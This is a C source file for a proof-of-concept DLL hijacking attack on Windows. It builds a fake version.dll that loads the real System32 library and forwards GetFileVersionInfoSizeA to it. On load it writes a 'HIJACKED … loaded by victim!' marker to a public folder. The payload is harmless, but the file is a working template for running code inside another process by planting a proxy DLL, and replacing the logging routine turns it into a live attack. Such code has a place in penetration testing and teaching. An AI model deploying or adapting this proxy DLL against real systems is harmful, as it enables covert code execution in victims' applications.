#include <windows.h>
#include <stdio.h>

static HMODULE real_version = NULL; // address of the real version.dll
typedef DWORD (WINAPI *GetFileVersionInfoSizeA_t)(LPCSTR, LPDWORD); // function pointer type for GetFileVersionInfoSizeA
static GetFileVersionInfoSizeA_t real_fn = NULL; // pointer to the real GetFileVersionInfoSizeA function

void log_hijack() {
    FILE *f = fopen("C:\\Users\\Public\\hijack_proof.txt", "a");
    if (f) {
        fprintf(f, "HIJACKED — version.dll loaded by victim!\n");
        fclose(f);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) { //
    if (reason == DLL_PROCESS_ATTACH) {
        real_version = LoadLibraryA("C:\\Windows\\System32\\version.dll");
        real_fn = (GetFileVersionInfoSizeA_t)
            GetProcAddress(real_version, "GetFileVersionInfoSizeA");
        log_hijack();
    }
    if (reason == DLL_PROCESS_DETACH) {
        if (real_version) FreeLibrary(real_version);
    }
    return TRUE;
}

DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR filename, LPDWORD dummy) {
    if (real_fn) return real_fn(filename, dummy);
    return 0;
}